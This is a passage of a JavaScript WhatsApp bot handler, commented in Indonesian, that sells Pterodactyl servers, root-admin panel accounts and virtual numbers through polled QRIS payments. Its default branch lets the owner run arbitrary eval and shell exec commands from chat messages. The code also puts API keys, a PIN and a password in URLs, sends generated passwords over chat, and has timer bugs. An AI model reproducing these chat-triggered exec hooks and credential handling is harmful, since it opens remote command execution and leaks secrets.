    const pay = await (await fetch(`https://aanapi.my.id/api/orkut/createpayment?apikey=aanboy&amount=${harga}&codeqr=${qrisorkut}`)).json();
    const expirationTime = new Date(pay.result.expirationTime);

    const teks3 = `
*乂 INFORMASI PEMBAYARAN*
 
 *• ID :* ${pay.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(pay.result.amount)}
 *• Barang :* 4gb Server
 *• Expired :* 5 menit

*Note :* 
QRIS pembayaran hanya berlaku dalam 5 menit. Jika sudah melewati 5 menit, pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil, bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan.
`;
    let msgQr = await cupen.sendMessage(m.chat, { image: { url: pay.result.qrImageUrl }, caption: teks3 }, { quoted: m });

    db.users[m.sender].status_deposit = true;
    db.users[m.sender].saweria = {
      msg: msgQr,
      chat: m.sender,
      idDeposit: pay.result.transactionId,
      amount: pay.result.amount.toString(),
      exp: function () {
        setTimeout(async () => {
          if (db.users[m.sender].status_deposit && db.users[m.sender].saweria) {
            await cupen.sendMessage(db.users[m.sender].saweria.chat, { text: "QRIS Pembayaran telah expired!" }, { quoted: db.users[m.sender].saweria.msg });
            await cupen.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
            db.users[m.sender].status_deposit = false;
            delete db.users[m.sender].saweria;
          }
        }, 300000); // 5 menit
      }
    };

    await db.users[m.sender].saweria.exp();

    // =======================
    // Cek Pembayaran
    // =======================
    while (db.users[m.sender].status_deposit && db.users[m.sender].saweria) {
      await sleep(8000);
      const resultcek = await axios.get(`https://aanapi.my.id/api/orkut/cekstatus?apikey=aanboy&merchant=${idmerchant}&keyorkut=${apikeyorkut}`);
      const req = await resultcek.data;

      if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
        db.users[m.sender].status_deposit = false;
        await clearInterval(db.users[m.sender].saweria.exp);
        await cupen.sendMessage(db.users[m.sender].saweria.chat, { text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* 4gb Server
        `}, { quoted: db.users[m.sender].saweria.msg });

        // =======================
        // Buat Pengguna
        // =======================
        let email = username + "@gmail.com";
        let password = crypto.randomBytes(4).toString('hex');

        let f = await fetch(global.domain2 + "/api/application/users", {
          method: "POST",
          headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
            Authorization: "Bearer " + global.apikey2
          },
          body: JSON.stringify({
            email: email,
            username: username.toLowerCase(),
            first_name: username,
            last_name: "Unlimited",
            language: "en",
            password: password
          })
        });
        let data = await f.json();
        if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

        let user = data.attributes;

        // =======================
        // Buat Server
        // =======================
        let f3 = await fetch(global.domain2 + "/api/application/servers", {
          method: "POST",
          headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
            Authorization: "Bearer " + global.apikey2
          },
          body: JSON.stringify({
            name: username,
            description: "Unlimited Server",
            user: user.id,
            egg: 15,
            docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
            startup: "npm start",
            environment: {
              INST: "npm",
              USER_UPLOAD: "0",
              AUTO_UPDATE: "0",
              CMD_RUN: "npm start"
            },
            limits: {
              memory: 4240,
              swap: 0,
              disk: 102400,
              io: 500,
              cpu: 0
            },
            feature_limits: {
              databases: 5,
              backups: 3,
              allocations: 1
            },
            deploy: {
              locations: [1],
              dedicated_ip: false,
              port_range: []
            }
          })
        });
        let serverRes = await f3.json();
        if (serverRes.errors) {
          console.error('Server Creation Error:', serverRes.errors);
          return m.reply(JSON.stringify(serverRes.errors[0], null, 2));
        }

        // Kirim informasi server ke pengguna
        let server = serverRes.attributes;
        let teks = `
*Berhasil Membuat Server ✅*

*• ID Server :* ${server.id}
*• Nama :* ${server.name}
*• Username :* ${user.username}
*• Password :* ${password}
*• Login :* ${global.domain2}
*• Expired :* 1 Bulan
`;
        await cupen.sendMessage(db.users[m.sender].saweria.chat, { text: teks }, { quoted: null });
        await cupen.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
        delete db.users[m.sender].saweria;
      }
    }
  } catch (error) {
    console.error('Error:', error);
    m.reply('❌ Gagal memproses transaksi. Silakan coba lagi.');
  }
}
break;

case 'buy5gb2': {
  if (m.isGroup) return m.reply("Pembelian hanya bisa dilakukan melalui private chat.");
  if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan. Ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

  const harga = 5000; // Harga paket Unlimited
  try {
    // =======================
    // Generate Username Acak
    // =======================
    const generateRandomUsername = () => {
      const characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
      let randomUsername = '';
      for (let i = 0; i < 8; i++) { // Panjang username acak (8 karakter)
        randomUsername += characters.charAt(Math.floor(Math.random() * characters.length));
      }
      return randomUsername;
    };

    const username = generateRandomUsername(); // Buat username acak
    console.log('Generated Username:', username); // Debugging: Cek username

    // =======================
    // Buat QRIS
    // =======================
    const pay = await (await fetch(`https://aanapi.my.id/api/orkut/createpayment?apikey=aanboy&amount=${harga}&codeqr=${qrisorkut}`)).json();
    const expirationTime = new Date(pay.result.expirationTime);

    const teks3 = `
*乂 INFORMASI PEMBAYARAN*
 
 *• ID :* ${pay.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(pay.result.amount)}
 *• Barang :* 5Gb Server
 *• Expired :* 5 menit

*Note :* 
QRIS pembayaran hanya berlaku dalam 5 menit. Jika sudah melewati 5 menit, pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil, bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan.
`;
    let msgQr = await cupen.sendMessage(m.chat, { image: { url: pay.result.qrImageUrl }, caption: teks3 }, { quoted: m });

    db.users[m.sender].status_deposit = true;
    db.users[m.sender].saweria = {
      msg: msgQr,
      chat: m.sender,
      idDeposit: pay.result.transactionId,
      amount: pay.result.amount.toString(),
      exp: function () {
        setTimeout(async () => {
          if (db.users[m.sender].status_deposit && db.users[m.sender].saweria) {
            await cupen.sendMessage(db.users[m.sender].saweria.chat, { text: "QRIS Pembayaran telah expired!" }, { quoted: db.users[m.sender].saweria.msg });
            await cupen.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
            db.users[m.sender].status_deposit = false;
            delete db.users[m.sender].saweria;
          }
        }, 300000); // 5 menit
      }
    };

    await db.users[m.sender].saweria.exp();

    // =======================
    // Cek Pembayaran
    // =======================
    while (db.users[m.sender].status_deposit && db.users[m.sender].saweria) {
      await sleep(8000);
      const resultcek = await axios.get(`https://aanapi.my.id/api/orkut/cekstatus?apikey=aanboy&merchant=${idmerchant}&keyorkut=${apikeyorkut}`);
      const req = await resultcek.data;

      if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
        db.users[m.sender].status_deposit = false;
        await clearInterval(db.users[m.sender].saweria.exp);
        await cupen.sendMessage(db.users[m.sender].saweria.chat, { text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* 5gb Server
        `}, { quoted: db.users[m.sender].saweria.msg });

        // =======================
        // Buat Pengguna
        // =======================
        let email = username + "@gmail.com";
        let password = crypto.randomBytes(4).toString('hex');

        let f = await fetch(global.domain2 + "/api/application/users", {
          method: "POST",
          headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
            Authorization: "Bearer " + global.apikey2
          },
          body: JSON.stringify({
            email: email,
            username: username.toLowerCase(),
            first_name: username,
            last_name: "Unlimited",
            language: "en",
            password: password
          })
        });
        let data = await f.json();
        if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

        let user = data.attributes;

        // =======================
        // Buat Server
        // =======================
        let f3 = await fetch(global.domain2 + "/api/application/servers", {
          method: "POST",
          headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
            Authorization: "Bearer " + global.apikey2
          },
          body: JSON.stringify({
            name: username,
            description: "Unlimited Server",
            user: user.id,
            egg: 15,
            docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
            startup: "npm start",
            environment: {
              INST: "npm",
              USER_UPLOAD: "0",
              AUTO_UPDATE: "0",
              CMD_RUN: "npm start"
            },
            limits: {
              memory: 5240,
              swap: 0,
              disk: 102400,
              io: 500,
              cpu: 0
            },
            feature_limits: {
              databases: 5,
              backups: 3,
              allocations: 1
            },
            deploy: {
              locations: [1],
              dedicated_ip: false,
              port_range: []
            }
          })
        });
        let serverRes = await f3.json();
        if (serverRes.errors) {
          console.error('Server Creation Error:', serverRes.errors);
          return m.reply(JSON.stringify(serverRes.errors[0], null, 2));
        }

        // Kirim informasi server ke pengguna
        let server = serverRes.attributes;
        let teks = `
*Berhasil Membuat Server ✅*

*• ID Server :* ${server.id}
*• Nama :* ${server.name}
*• Username :* ${user.username}
*• Password :* ${password}
*• Login :* ${global.domain2}
*• Expired :* 1 Bulan
`;
        await cupen.sendMessage(db.users[m.sender].saweria.chat, { text: teks }, { quoted: null });
        await cupen.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
        delete db.users[m.sender].saweria;
      }
    }
  } catch (error) {
    console.error('Error:', error);
    m.reply('❌ Gagal memproses transaksi. Silakan coba lagi.');
  }
}
break; 

case 'buyadminpanel':
{
 let audioFile = './audio.mp3';
await cupen.sendMessage(m.chat, { react: { text: '♨️', key: m.key } })
 const msgii = await generateWAMessageFromContent(m.chat, {
 viewOnceMessageV2Extension: {
 message: {
 messageContextInfo: {
 deviceListMetadata: {},
 deviceListMetadataVersion: 2
 }, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: "*_Aᴅᴍɪɴ Pᴀɴᴇʟ_*"
 }),
 carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
 cards: [{
 body: proto.Message.InteractiveMessage.Body.fromObject({
 }),
 footer: proto.Message.InteractiveMessage.Footer.fromObject({
 }),
 header: proto.Message.InteractiveMessage.Header.fromObject({
 title: `*_Sɪʟᴀʜᴋᴀɴ Pɪʟɪʜ Aᴅᴍɪɴ Pᴀɴᴇʟ Dɪ Bᴀᴡᴀʜ_*
`,
 hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: { url: 'https://files.catbox.moe/rvrqwv.jpg' }}, { upload: cupen.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
 buttons: [
 {
"name": "single_select",
"buttonParamsJson": `{ "title": "Aᴅᴍɪɴ Pᴀɴᴇʟ", "sections": [{ "title": "# ꜱɪʟᴀʜᴋᴀɴ ᴘɪʟɪʜ ꜱᴀʟᴀʜ ꜱᴀᴛᴜ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ", "highlight_label": \"Pᴏᴡᴇʀᴇᴅ Bʏ ❀SalwaCantik❀\", "rows": [{ "header": "Aᴅᴍɪɴ Pᴀɴᴇʟ", "title": "くそ 10.000", "id": ".buyadp" }, 
{ "header": "Aᴅᴍɪɴ Pᴀɴᴇʟ Pʀɪᴠᴀᴛᴇ", "title": "くそ 15.000", "id": ".buyadp2" }]}]}`
}, 

 {
 "name": "cta_url",
 "buttonParamsJson": `{\"display_text\":\"Chanell Developer\",\"url\":\"https://whatsapp.com/channel/0029VajU7yJJZg47Mgw99L0W\",\"merchant_url\":\"https://t.me/botobf\"}`
 }]
 })
 }
 ]
 })
 })
 }
 }
 }, { userJid: m.sender, quoted: qtoko })
 await cupen.relayMessage(m.chat, msgii.message, { messageId: msgii.key.id })
 await cupen.sendMessage(m.chat, {
 audio: { url: audioFile },
 mimetype: 'audio/mpeg'
 }, { quoted: fkontak })
 }
 break
 
 case 'buyadp2': {
  if (m.isGroup) return m.reply("Pembelian panel pterodactyl hanya bisa di dalam private chat");
  if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

  // Generate Nama Acak
  const generateRandomUsername = () => {
    const characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let randomUsername = '';
    for (let i = 0; i < 8; i++) { // Panjang username acak (8 karakter)
      randomUsername += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return randomUsername;
  };

  let us = crypto.randomBytes(2).toString('hex');
  let Obj = {};
  Obj.harga = "2"; 
  Obj.username = generateRandomUsername() + us; // Menggunakan nama acak
  const UrlQr = global.qrisOrderKuota;

  const amount = Number(Obj.harga) + generateRandomNumber(110, 250);
  const get = await axios.get(`https://aanapi.my.id/api/orkut/createpayment?apikey=aanboy&amount=${amount}&codeqr=${qrisorkut}`);
  const teks3 = `
*乂 INFORMASI PEMBAYARAN*
 
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Admin Panel Pterodactyl
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`;

  let msgQr = await cupen.sendMessage(m.chat, { image: { url: get.data.result.qrImageUrl }, caption: teks3 }, { quoted: m });
  db.users[m.sender].status_deposit = true;
  db.users[m.sender].saweria = {
    msg: msgQr,
    chat: m.sender,
    idDeposit: get.data.result.transactionId,
    amount: get.data.result.amount.toString(),
    exp: function () {
      setTimeout(async () => {
        if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
          await cupen.sendMessage(db.users[m.sender].saweria.chat, { text: "QRIS Pembayaran telah expired!" }, { quoted: db.users[m.sender].saweria.msg });
          await cupen.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
          db.users[m.sender].status_deposit = false;
          await clearInterval(db.users[m.sender].saweria.exp);
          delete db.users[m.sender].saweria;
        }
      }, 300000);
    }
  };

  await db.users[m.sender].saweria.exp();

  while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
    await sleep(8000);
    const resultcek = await axios.get(`https://aanapi.my.id/api/orkut/cekstatus?apikey=aanboy&merchant=${idmerchant}&keyorkut=${apikeyorkut}`);
    const req = await resultcek.data;
    if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
      db.users[m.sender].status_deposit = false;
      await clearInterval(db.users[m.sender].saweria.exp);
      await cupen.sendMessage(db.users[m.sender].saweria.chat, { text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Admin Panel Pterodactyl
`}, { quoted: db.users[m.sender].saweria.msg });

      let username = Obj.username;
      let email = username + "@gmail.com";
      let name = capital(username);
      let password = crypto.randomBytes(4).toString('hex');
      let f = await fetch(global.domain2 + "/api/application/users", {
        "method": "POST",
        "headers": {
          "Accept": "application/json",
          "Content-Type": "application/json",
          "Authorization": "Bearer " + global.apikey2
        },
        "body": JSON.stringify({
          "email": email,
          "username": username.toLowerCase(),
          "first_name": name,
          "last_name": "Admin",
          "root_admin": true,
          "language": "en",
          "password": password.toString()
        })
      });

      let data = await f.json();
      if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
      let user = data.attributes;
      var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domain}
* *Expired :* 1 Bulan

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`;
      await cupen.sendMessage(db.users[m.sender].saweria.chat, { text: teks }, { quoted: null });
      await cupen.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
      delete db.users[m.sender].saweria;
    }
  }
}
break;

case 'ceksaldo-orkut': {
if (!isOwner) return m.reply(mess.ketua);
const url = `https://h2h.okeconnect.com/trx/balance?memberID=${idmerchant}&pin=${pinOrkut}&password=${pwOrkut}`
const res = await fetchJson(url);
const ror = `
Berikut Adalah Saldo Orkut Anda ❗

 *• Merchant :* ${idmerchant}
 *• Balance :* ${res}
`
m.reply(ror)
}

break;

case 'listnokos':
{
 let audioFile = './audio.mp3';
await cupen.sendMessage(m.chat, { react: { text: '♨️', key: m.key } })
 const msgii = await generateWAMessageFromContent(m.chat, {
 viewOnceMessageV2Extension: {
 message: {
 messageContextInfo: {
 deviceListMetadata: {},
 deviceListMetadataVersion: 2
 }, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: "*_Lɪsᴛ Nᴏᴋᴏs_*"
 }),
 carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
 cards: [{
 body: proto.Message.InteractiveMessage.Body.fromObject({
 }),
 footer: proto.Message.InteractiveMessage.Footer.fromObject({
 }),
 header: proto.Message.InteractiveMessage.Header.fromObject({
 title: `*_Sɪʟᴀʜᴋᴀɴ Pɪʟɪʜ Nᴏᴋᴏs Dɪ Bᴀᴡᴀʜ_*
`,
 hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: { url: 'https://files.catbox.moe/rvrqwv.jpg' }}, { upload: cupen.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
 buttons: [
 {
"name": "single_select",
"buttonParamsJson": `{ "title": "Lɪsᴛ Nᴏᴋᴏs", "sections": [{ "title": "# ꜱɪʟᴀʜᴋᴀɴ ᴘɪʟɪʜ ꜱᴀʟᴀʜ ꜱᴀᴛᴜ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ", "highlight_label": \"Pᴏᴡᴇʀᴇᴅ Bʏ ❀SalwaCantik❀\", "rows": [{ "header": "Nᴏᴋᴏs Iɴᴅᴏɴᴇsɪᴀ", "title": "くそ 5.000", "id": ".ordernokos 1" }, 
{ "header": "Nᴏᴋᴏs Aᴍᴇʀɪᴋᴀ", "title": "くそ 15.000", "id": ".ordernokos 4" }]}]}`
}, 

 {
 "name": "cta_url",
 "buttonParamsJson": `{\"display_text\":\"Chanell Developer\",\"url\":\"https://whatsapp.com/channel/0029VajU7yJJZg47Mgw99L0W\",\"merchant_url\":\"https://t.me/botobf\"}`
 }]
 })
 }
 ]
 })
 })
 }
 }
 }, { userJid: m.sender, quoted: qtoko })
 await cupen.relayMessage(m.chat, msgii.message, { messageId: msgii.key.id })
 await cupen.sendMessage(m.chat, {
 audio: { url: audioFile },
 mimetype: 'audio/mpeg'
 }, { quoted: fkontak })
 }
 break

 case 'ordernokos':
 {
 await handleOrderNokos(m, db, cupen, text);
 }
 break;
 case 'nokosnoredy': {
 m.reply(`
*❌ Nokos Tidak Tersedia ❌*

*Mohon tunggu sampai admin melakukan restok kembali.
Terima kasih atas pengertiannya!* 🙏
`)
}
break;

case 'brat':
{
 try {
 if (!text) return m.reply(`*Format Salah!*\nContoh: ${prefix + command} <text>`);
 let res = await getBuffer(`https://btch.us.kg/brat?text=${text}`)
 // Kirim stiker
 await cupen.sendMessage(
 m.chat,
 { 
 sticker: res, 
 mimetype: 'image/webp', 
 packname: 'MyBot Sticker', 
 author: '❀SalwaCantik❀' 
 },
 { quoted: m }
 )

 } catch (error) {
 console.error('Error pada case sticker:', error);
 cupen.sendMessage(m.chat, { 
 text: `*❌ Terjadi kesalahan saat membuat sticker.*\n\nDetail: ${error}` 
 }, { quoted: m });
 }
}
break
 
default:
   
    
                
if (budy.startsWith('=>')) {
if (!isCreator) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return m.reply(bang)
}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))
}
}
if (!isCmd) {
let check = list.find(e => e.cmd == body.toLowerCase())
if (check) {
await m.reply(check.respon)
}
}
if (budy.startsWith('>')) {
if (!isCreator) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m.reply(require('util').format(teks))
}
}
setInterval(() => {
    for (let [key, value] of Object.entries(global.stockMarket)) {
        const change = (Math.random() * 2 - 1).toFixed(2); // Perubahan harga -1% hingga +1%
        value.price += Math.floor(value.price * (change / 100));
        value.change = parseFloat(change);
    }
    console.log('📈 Harga saham diperbarui:', global.stockMarket);
}, 300000); // Setiap 5 menit
if (budy.startsWith('$')) {
if (!isCreator) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}
}

} catch (err) {
console.log(util.format(err))
}
}

let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
	require('fs').unwatchFile(file)
	console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
	delete require.cache[file]
	require(file)
})

